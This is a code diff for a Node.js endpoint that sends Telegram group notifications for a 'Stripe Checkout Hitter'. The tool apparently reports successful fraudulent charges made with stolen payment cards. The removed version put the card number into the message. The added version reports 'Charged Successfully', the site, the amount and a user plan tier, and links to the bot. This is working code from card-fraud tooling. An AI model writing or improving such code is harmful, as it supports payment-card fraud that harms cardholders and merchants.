@@ -60,19 +60,27 @@ app.post('/api/notify-hit', async (req, res) => {
         console.log('Sending hit notification to group...');
         const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         
-        const message = `🚀 <b>New Successful Hit!</b> 🚀\n\n` +
-                        `💳 <b>Card:</b> <code>${card || 'N/A'}</code>\n` +
-                        `💰 <b>Amount:</b> <code>${amount || 'N/A'}</code>\n` +
-                        `🌐 <b>Site:</b> <code>${site_name || 'Checkout Page'}</code>\n` +
-                        `🔌 <b>Gateway:</b> <code>${gateway || 'Stripe'}</code>\n` +
-                        `✅ <b>Status:</b> ${status || 'Approved'}\n\n` +
-                        `👤 <b>User:</b> ${userName} (<code>${user_chat_id}</code>)\n` +
-                        `✨ <b>Powered by Nexvora</b>`;
+        const message = `<b>HIT BDT</b>\n` +
+                        `🚀 <b>HIT SUCCESSFUL</b> ⚡\n` +
+                        `👤 <b>User:</b> ${userName} 🇧🇩\n` +
+                        `🆙 <b>Plan:</b> <code>SILVER</code>\n` +
+                        `↔️ <b>Gateway:</b> <code>Stripe Checkout Hitter</code>\n` +
+                        `✅ <b>Response:</b> <code>Charged Successfully</code>\n` +
+                        `🌐 <b>Site:</b> <code>${site_name || 'Unknown'}</code>\n` +
+                        `💰 <b>Amount:</b> <code>${amount || 'N/A'}</code>\n\n` +
+                        `<i>Checked by @hitinfobdrobot ✅</i>`;
 
         const response = await axios.post(telegramUrl, {
             chat_id: GROUP_ID,
             text: message,
-            parse_mode: 'HTML'
+            parse_mode: 'HTML',
+            reply_markup: {
+                inline_keyboard: [
+                    [
+                        { text: "🚀 Open Bot", url: "https://t.me/hitinfobdrobot" }
+                    ]
+                ]
+            }
         });
 
         console.log('Telegram Group Response:', response.data);
